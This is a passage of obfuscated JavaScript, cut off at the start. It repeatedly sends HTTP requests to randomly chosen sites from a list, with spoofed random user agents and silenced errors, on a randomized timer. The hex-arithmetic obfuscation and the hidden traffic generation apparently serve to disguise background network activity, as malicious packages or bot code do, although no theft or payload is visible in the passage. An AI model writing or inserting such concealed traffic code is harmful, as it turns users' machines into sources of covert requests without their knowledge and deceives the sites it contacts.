      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1 * -0xc59 + 0x1 * -0xf85 + 0x3736) * getRandomInt(-0x258f + 0x9 * -0x1f1 + -0x3709 * -0x1, -0x4 * 0x6b2 + -0x841 * -0x1 + -0x4a3 * -0x4));
}, -0x1 * -0x2187 + 0xe87 * 0x1 + 0x2 * -0x17d5);